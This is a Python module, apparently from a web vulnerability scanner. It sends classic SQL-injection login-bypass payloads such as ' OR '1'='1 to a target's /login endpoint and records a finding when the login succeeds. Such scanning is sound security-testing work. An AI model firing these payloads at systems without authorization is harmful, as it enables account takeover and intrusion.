"""
SQL Injection detection module.

Strategy: send classic auth-bypass payloads to the login endpoint and
check whether the server incorrectly reports success. This is
"authentication-bypass-via-injection" detection, the most reliable
and demo-safe SQLi technique (no destructive payloads like DROP TABLE).

Each finding is tagged with:
  - produces: what an attacker gains if this succeeds (used by chain_engine.py
    to detect multi-step exploit paths)
  - requires: what an attacker needs before this attack works (empty here,
    since this bug needs no prior access)
"""
import requests

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "admin'--",
]


def test_sqli(base_url: str) -> list[dict]:
    findings = []
    for payload in SQLI_PAYLOADS:
        try:
            r = requests.post(
                f"{base_url}/login",
                data={"username": payload, "password": "irrelevant"},
                timeout=5,
            )
        except requests.exceptions.RequestException:
            continue  # target unreachable for this attempt, try next payload

        # Normalize whitespace/case before checking so formatting differences
        # in the JSON response don't cause a false negative.
        body_normalized = r.text.replace(" ", "").lower()
        if r.status_code == 200 and '"success":true' in body_normalized:
            findings.append({
                "type": "SQL Injection",
                "endpoint": "/login",
                "method": "POST",
                "payload": payload,
                "evidence": r.text[:200],
                "requires_auth": False,
                "produces": ["admin_credentials"],
                "requires": [],
            })
            break  # one confirmed hit is enough, no need to keep spraying payloads
    return findings
